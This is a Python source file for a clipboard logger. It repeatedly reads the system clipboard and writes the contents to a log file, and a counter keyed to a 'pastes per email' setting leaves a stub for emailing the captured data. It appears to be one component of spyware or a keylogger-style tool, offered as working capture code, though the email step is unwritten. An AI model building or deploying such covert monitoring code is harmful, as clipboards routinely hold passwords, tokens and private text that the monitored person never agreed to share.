from pyperclip import paste
from time import sleep
from os import _exit
from os.path import join
from utils.utils import log, handle_counter
from config import LOGS_DIRECTORY_PATH, CLIPBOARD_INTERVAL, PASTES_PER_EMAIL


class ClipboardLogger:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH
        self.interval = CLIPBOARD_INTERVAL
        self.counter = 0
        self.counter_max = PASTES_PER_EMAIL
        self.running = True

    def log_clipboard(self):
        log(f'{paste().replace("\n", r'\n')}', join(self.logs_directory_path, "clipboard.txt"))

    def run(self):
        try:
            while self.running:
                self.log_clipboard()
                self.counter += 1
                if handle_counter(self.counter, self.counter_max):
                    pass  # email logic?
                sleep(self.interval)
        except Exception as e:
            log("AN ERROR OCCURED WHILE LOGGING CLIPBOARD:", "errors.txt")
            log(e)


def main():
    clipboard_logger = ClipboardLogger()
    try:
        clipboard_logger.run()
    except Exception:
        clipboard_logger.running = False
        print("An error occured while logging clipboard.")
        print("See full error here:")  # TODO:  add where to find error log
        return 1

    return 0


if __name__ == "__main__":
    _exit(main())
